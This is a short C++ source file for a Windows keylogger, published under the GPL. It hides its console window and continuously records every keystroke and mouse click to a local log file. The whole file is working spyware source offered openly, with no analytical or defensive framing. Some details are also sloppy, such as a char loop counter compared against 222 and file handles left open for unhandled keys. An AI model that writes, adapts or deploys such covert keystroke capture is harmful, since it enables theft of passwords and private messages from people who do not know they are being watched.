/*
    Copyright 2008 Daniel Amodio aka deige101
    Created for Major League Coding

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    char i;

    while (true)
    {

        for(i=8;i<=222;i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                FILE *file;
                file=fopen("log.txt","a+");

                if(file!=NULL)
                {
                    if((i>=39)&&(i<=64))
                    {
                        fputc(i,file);
                        fclose(file);
                    }
                    else if((i>64)&&(i<91))
                    {
                        i+=32;
                        fputc(i,file);
                        fclose(file);
                    }
                    else
                    {
                        switch(i)
                        {
                            case VK_SPACE:
                            fputc(' ',file);
                            fclose(file);
                            break;
                            case VK_LBUTTON:
                            fputs("[LMB]",file);
                            fclose(file);
                            break;
                            case VK_RBUTTON:
                            fputs("[RMB]",file);
                            fclose(file);
                            break;
                            case VK_BACK:
                            fputs("[BKSP]",file);
                            fclose(file);
                            break;
                            case VK_TAB:
                            fputs("[TAB]",file);
                            fclose(file);
                            break;
                            case VK_RETURN:
                            fputs("[ENTER]\n",file);
                            fclose(file);
                            break;
                            case VK_SHIFT:
                            fputs("[SHIFT]",file);
                            fclose(file);
                            break;
                            case VK_CONTROL:
                            fputs("[CTRL]",file);
                            fclose(file);
                            break;
                            case VK_MENU:
                            fputs("[ALT]",file);
                            fclose(file);
                            break;
                            case VK_CAPITAL:
                            fputs("[CAPS]",file);
                            fclose(file);
                            break;
                            case VK_ESCAPE:
                            fputs("[ESC]",file);
                            fclose(file);
                            break;
                            case VK_INSERT:
                            fputs("[INSERT]",file);
                            fclose(file);
                            break;
                            case VK_DELETE:
                            fputs("[DEL]",file);
                            fclose(file);
                            break;
                            case VK_NUMPAD0:
                            fputc('0',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD1:
                            fputc('1',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD2:
                            fputc('2',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD3:
                            fputc('3',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD4:
                            fputc('4',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD5:
                            fputc('5',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD6:
                            fputc('6',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD7:
                            fputc('7',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD8:
                            fputc('8',file);
                            fclose(file);
                            break;
                            case VK_NUMPAD9:
                            fputc('9',file);
                            fclose(file);
                            break;
                            case VK_OEM_1:
                            fputs("[;:]",file);
                            fclose(file);
                            break;
                            case VK_OEM_2:
                            fputs("[/?]",file);
                            fclose(file);
                            break;
                            case VK_OEM_3:
                            fputs("[`~]",file);
                            fclose(file);
                            break;
                        }
                    }
                }
                else {return 1;}
            }
        }
    }
    return 0;

}
